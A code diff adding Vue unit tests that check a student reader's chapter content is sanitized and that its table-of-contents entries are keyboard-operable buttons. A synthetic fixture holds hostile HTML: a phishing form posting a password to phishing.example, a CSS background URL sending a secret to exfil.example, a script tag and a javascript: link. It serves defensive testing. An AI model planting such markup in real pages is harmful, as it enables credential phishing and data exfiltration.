@@ -188,3 +188,84 @@ describe('v2 学生阅读列 · 标记完成', () => {
     wrapper.unmount()
   })
 })
+
+/**
+ * F-1／F-4：正文净化档位与目录项的可操作性。
+ * 样本是合成字符串（不是真实课件），逐条对应处置前后的差量构造。
+ */
+describe('v2 学生阅读列 · 正文净化与目录键盘可达', () => {
+  const POLLUTED =
+    '<p class="lead">正常正文</p>' +
+    '<form action="https://phishing.example/login"><input name="password"></form>' +
+    '<div style="background:url(https://exfil.example/collect?d=secret)">外带</div>' +
+    '<script>alert(1)</script>' +
+    '<a href="javascript:alert(2)">点我</a>'
+
+  it('列表接口带回的正文按 sanitize 档位渲染：表单／内联样式／脚本／伪协议一律不进 DOM', async () => {
+    chapterApi.getChapters.mockResolvedValueOnce({
+      data: [{ id: 6101, title: '绪论', content: POLLUTED, isPublished: true, taskCount: 1 }],
+    })
+
+    const wrapper = mountReader()
+    await flushPromises()
+
+    const html = wrapper.find('.reader-content').html()
+    expect(html).toContain('正常正文')
+    expect(html).toContain('class="lead"')
+    expect(html).not.toContain('<form')
+    expect(html).not.toContain('phishing.example')
+    expect(html).not.toContain('<input')
+    expect(html).not.toContain('style=')
+    expect(html).not.toContain('exfil.example')
+    expect(html).not.toContain('<script')
+    expect(html).not.toContain('javascript:')
+    wrapper.unmount()
+  })
+
+  it('按需读取的单章正文走同一条净化路（第二个调用点不是漏网的）', async () => {
+    chapterApi.getChapters.mockResolvedValueOnce({
+      data: [{ id: 6101, title: '绪论', isPublished: true }],
+    })
+    chapterApi.getChapterById.mockResolvedValueOnce({ data: { content: POLLUTED } })
+
+    const wrapper = mountReader()
+    await flushPromises()
+
+    expect(chapterApi.getChapterById).toHaveBeenCalledWith(6101)
+    const html = wrapper.find('.reader-content').html()
+    expect(html).toContain('正常正文')
+    expect(html).not.toContain('<form')
+    expect(html).not.toContain('<input')
+    expect(html).not.toContain('style=')
+    expect(html).not.toContain('<script')
+    wrapper.unmount()
+  })
+
+  it('目录项是真正的 button：可聚焦、Enter/Space 由 UA 转成 click，且不带 href', async () => {
+    // 聚焦断言要求节点在 document 里（默认挂载是脱离文档的），故挂进一个临时容器
+    const host = document.createElement('div')
+    document.body.appendChild(host)
+    const wrapper = mount(ReaderTab, { props: { courseId: COURSE_ID }, attachTo: host })
+    await flushPromises()
+
+    // F-4 前这里是 <a href="javascript:void(0)">：位点清单与伪协议都不该再出现
+    expect(wrapper.findAll('.toc-panel a')).toHaveLength(0)
+    const items = wrapper.findAll('.toc-panel button')
+    expect(items).toHaveLength(2)
+    for (const item of items) {
+      expect(item.attributes('type')).toBe('button')
+      expect(item.attributes('href')).toBeUndefined()
+    }
+
+    const second = items[1].element as HTMLButtonElement
+    second.focus()
+    expect(document.activeElement).toBe(second)
+
+    // 键盘激活在浏览器里由 UA 转成 click 事件，这里用原生 click() 复现同一条路径
+    second.click()
+    await flushPromises()
+    expect(wrapper.find('.reader-panel h2').text()).toContain('协议分层')
+    wrapper.unmount()
+    host.remove()
+  })
+})
